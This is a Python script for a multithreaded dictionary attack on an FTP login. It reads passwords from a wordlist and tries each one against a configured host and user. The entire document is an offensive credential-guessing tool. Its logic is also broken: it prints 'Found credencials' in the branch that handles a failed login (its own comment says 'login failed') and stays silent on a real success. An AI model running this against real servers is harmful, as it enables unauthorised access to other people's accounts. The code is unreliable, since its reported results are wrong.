import ftplib
from threading import Thread
import queue
from colorama import Fore, init

# init the console for windows
init()

# initialize the queue
q = queue.Queue()

# number of threads to spawn
n_threads = 30

# hostname or IP address of the FTP server
host = "127.0.0.1"

# username of the ftp server (root as default for linux)
user = "test"

# port of the ftp
port = 21


def connect_ftp():
    global q
    while True:
        # get the password fromt the queue
        password = q.get()
        # init the ftp server object
        server = ftplib.FTP()
        print("[!] Trying", password)
        try:
            # tries to connect to ftp server with a timeout of 5
            server.connect(host, port, timeout=5)
            # login using the credencials (user & password)
            server.login(user, password)
        except ftplib.error_perm:
            # login failed, wrong credentials
            print(f"{Fore.GREEN}[+] Found credencials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f"\tPassword: {password}{Fore.RESET}")
            # clear queue
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
        finally:
            # notify the queue task is complete
            q.task_done()


# read the wordlist of passwords
passwords = open("simple_wordlist.txt").read().split("\n")
print("[+] Passwords to try: ", len(passwords))

# put all passwords to the queue
for password in passwords:
    q.put(password)

for t in range(n_threads):
    thread = Thread(target=connect_ftp)
    # will end the main thread end
    thread.daemon = True
    thread.start()

# wait for the queue to be empty
q.join()
